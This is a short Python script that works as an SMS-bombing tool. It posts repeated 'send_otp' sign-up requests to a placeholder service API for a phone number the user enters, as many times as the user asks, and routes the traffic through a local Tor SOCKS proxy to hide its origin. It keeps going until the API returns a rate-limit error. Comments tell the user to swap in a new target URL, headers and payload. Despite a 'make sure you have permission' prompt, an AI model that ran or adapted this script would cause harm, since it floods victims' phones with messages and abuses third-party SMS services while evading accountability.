import requests
import time

def send_sms_request(target_number):
    #change your target url
    url = "https://services.example.com/api/bloger/cta/push-data"
    
    #change headers according to target
    headers = {
        "Host": "services.example.com",
        "Sec-Ch-Ua": '"Chromium";v="119", "Not?A_Brand";v="24"',
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Origin": "https://example.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://example.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i",
        "Connection": "close"
    }
    
    #change payload according to target
    payload = {
        "source_page": "-",
        "event_to": "MoEngage",
        "ui_name": "GetStarted",
        "cta_name": "cta_GetStart",
        "cta_type": "Sign Up CTA",
        "cta_route": "https://services.example.com/api/bloger/cta/push-data",
        "user_action": "send_otp",
        "record_id": "0",
        "name": "jam",
        "mobile": target_number,
        "otp_1": "",
        "otp_2": "",
        "otp_3": "",
        "otp_4": ""
    }
    
    proxies = {
        "http": "socks5://127.0.0.1:9050",
        "https": "socks5://127.0.0.1:9050"
    }
    
    response = requests.post(url, headers=headers, data=payload, proxies=proxies)
    return response

def main():
    target_number = input("Enter the phone number to test (make sure you have permission): ")
    num_requests = int(input("How many requests do you want to send? "))
    for i in range(num_requests):
        print(f"Sending request number {i+1}...")
        response = send_sms_request(target_number)
        print(f"Status Code: {response.status_code}")
        if response.status_code == 429:
            print("Whoa, we hit the rate limit! The API stopped us.")
            break
        time.sleep(1)

main()
